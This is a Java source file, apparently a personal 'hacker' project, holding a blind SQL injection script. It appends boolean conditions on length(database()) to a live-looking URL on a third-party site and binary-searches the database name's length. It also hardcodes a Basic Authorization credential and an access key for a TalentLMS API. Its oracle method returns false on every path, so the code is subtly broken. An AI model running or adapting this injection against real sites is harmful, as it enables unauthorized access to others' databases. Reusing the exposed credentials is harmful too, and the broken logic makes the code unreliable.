package com.myweb.hacker;

import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

/**
 * Created by BHWL on 2016-12-28.
 */
public class SqlMangZhu {

    public static int time = 0;

    public static void string1() {
        System.out.println("Hello World!");
        String url = "https://eerg.talentlms.com/api/v1/gotocourse/user_id:2,course_id:125,course_completed_redirect:google.com,logout_redirect:google.com";
        RestTemplate restTemplate = new RestTemplate();
        HttpHeaders requestHeaders = new HttpHeaders();
        requestHeaders.set("Authorization", "Basic WUhQV2VtRzhSZXdMbG0yNFdUTEtNWmFsSEFKcGxiOg==");
        HttpEntity<?> requestEntity = new HttpEntity(requestHeaders);
        HttpEntity<String> response = restTemplate.exchange(url, HttpMethod.GET, requestEntity, String.class);
        String body = response.getBody();
        System.out.println(body);
        String page = restTemplate.getForObject("https://eerg.talentlms.com/index/gotocourse/key:eu7jy4atzuxbjcjtay4e14816156782,course_id:125", String.class);
        System.out.println(page);
    }

    public static boolean isTrue(String url) {
        time++;
        System.out.println("Times is " + time);
        System.out.println(url);
        RestTemplate restTemplate = new RestTemplate();
        try {
            restTemplate.getForObject(url, String.class);
        } catch (HttpClientErrorException e) {
            return false;
        }
        return false;
    }


    public static boolean isDatabaseLengthMoreTrue(String url, int more) {
        String sql = " and length(database()) >= " + more;
        return isTrue(url + sql);
    }

    public static boolean isDatabaseLengthLessTrue(String url, int less) {
        String sql = " and length(database()) <= " + less;
        return isTrue(url + sql);
    }

    public static boolean isDatabaseLengthEqualsTrue(String url, int count) {
        String sql = " and length(database()) = " + count;
        return isTrue(url + sql);
    }

    public static int databaseLength(String url) {
        int more = 1;
        int less = 10;
        int count = 1;
        while (true) {
            //System.out.println("More = " + more);
            // System.out.println("Less = " + less);
            if ((less - more) == 1) {
                while (!isDatabaseLengthEqualsTrue(url, more)) {
                    more++;
                }
                return more;
            } else if (more == less) {
                return more;
            } else {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                if (isDatabaseLengthLessTrue(url, count)) {
                    less = count;
                    count = less - ((less - more) / 2);
                } else if (isDatabaseLengthMoreTrue(url, count)) {
                    more = count;
                    count = more + ((less - more) / 2);
                }
            }
        }

    }

    public static void main(String[] args) {
        String url = "http://www.jatofund.com//lxwm/show.php?lang=cn&id=19";
        System.out.println(databaseLength(url));
    }


}
